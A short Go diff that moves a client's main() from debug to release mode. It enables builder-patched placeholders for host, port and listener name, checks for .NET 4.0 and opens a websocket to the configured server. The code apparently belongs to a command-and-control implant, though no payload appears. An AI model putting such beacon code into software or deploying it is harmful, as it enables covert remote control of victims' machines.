@@ -144,24 +144,24 @@ var ClientWorking bool
 
 func main() {
 	//release
-	// Host := "HostAAAABBBBCCCCDDDD"
-	// Port := "PortAAAABBBBCCCCDDDD"
-	///ListenerName := "ListenNameAAAABBBBCCCCDDDD"
-	// route := "RouteAAAABBBBCCCCDDDD"
-	// PcInfo.Host = strings.ReplaceAll(Host, " ", "")
-	// PcInfo.Port = strings.ReplaceAll(Port, " ", "")
-	//PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
-	// PcInfo.IsDotNetFour = checkDotNetFramework40()
+	Host := "HostAAAABBBBCCCCDDDD"
+	Port := "PortAAAABBBBCCCCDDDD"
+	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
+	route := "RouteAAAABBBBCCCCDDDD"
+	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
+	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
+	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	PcInfo.IsDotNetFour = checkDotNetFramework40()
 	///Debug
 	// Host := "192.168.31.250"
 	// Port := "80"
-	PcInfo.ListenerName = "ddd"
+	// PcInfo.ListenerName = "ddd"
 
-	//route := "www"
-	//url := "ws://www.sftech.shop:443//www"
-	//url := "ws://" + Host + ":" + Port + "/" + route
+	// //route := "www"
+	// //url := "ws://www.sftech.shop:443//www"
+	url := "ws://" + Host + ":" + Port + "/" + route
 
-	url := "ws://tests.sftech.shop:443/Echo"
+	// url := "ws://tests.sftech.shop:443/Echo"
 	url = strings.ReplaceAll(url, " ", "")
 	run_main(url)
 }
